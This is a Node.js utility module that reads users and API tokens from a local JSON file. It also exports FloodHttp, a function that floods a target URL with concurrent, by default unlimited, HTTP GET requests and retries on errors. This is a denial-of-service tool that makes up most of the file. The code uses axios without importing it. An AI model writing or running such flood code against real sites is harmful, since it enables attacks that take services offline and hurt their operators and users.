// utils.js
const fs = require('fs');
const dbPath = './db.json';

const readDB = () => {
  return JSON.parse(fs.readFileSync(dbPath, 'utf8'));
};

const users = readDB().users;

const validateToken = (token, route) => {
  const dbData = readDB();
  const tokenEntry = dbData.apiTokens.find(t => t.token === token);
  if (!tokenEntry) return false; // Token not found
  return tokenEntry.allowedRoutes.includes(route) || tokenEntry.allowedRoutes.includes('*');
};

const FloodHttp = (url, timeout, concurrentRequests = 1, totalRequests = Infinity) => {
    let completed = 0;
    let active = true;

    const makeRequest = async () => {
        if (!active) return;
        try {
            await axios.get(url, { timeout: 5000 }); // 5-second timeout per request
            console.log(`Request completed. Total: ${++completed}`);
            if (completed < totalRequests) {
                setTimeout(makeRequest, timeout);
            } else {
                active = false;
                console.log('Flood completed as total requests reached.');
            }
        } catch (error) {
            console.error('Error making request:', error.message);
            // To prevent overload, wait a bit longer before next attempt
            setTimeout(makeRequest, timeout * 2);
        }
    };

    // Initiate concurrent requests
    for (let i = 0; i < concurrentRequests; i++) {
        makeRequest();
    }

    // Optional: Provide a way to stop the flood
    return {
        stop: () => {
            active = false;
            console.log('Flood stopped manually.');
        }
    };
};

module.exports = { users, validateToken, FloodHttp };